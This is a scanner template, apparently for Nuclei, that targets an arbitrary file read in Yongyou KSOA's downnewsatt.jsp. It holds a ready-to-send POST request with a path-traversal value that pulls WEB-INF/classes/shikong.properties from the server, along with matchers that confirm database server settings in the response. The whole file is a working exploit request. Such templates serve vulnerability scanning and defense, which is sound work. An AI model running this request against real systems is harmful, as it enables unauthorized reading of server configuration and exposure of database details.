id: poc-yaml-yongyou-ksoa-downnewsatt-jsp-anyfile-read
info:
  name: Yongyou KSOA downnewsatt.jsp Arbitrary File Read
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
http:
  - raw:
      - |
        POST /newspublish/downnewsatt.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        exclusivenm=../../WEB-INF/classes/shikong.properties
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "debug="
          - "server.dbserver="
      - type: word
        part: body
        negative: true
        words:
          - "<"
      - type: word
        part: header
        words:
          - "filename="
      - type: word
        part: header
        words:
          - "application/x-msdownload"
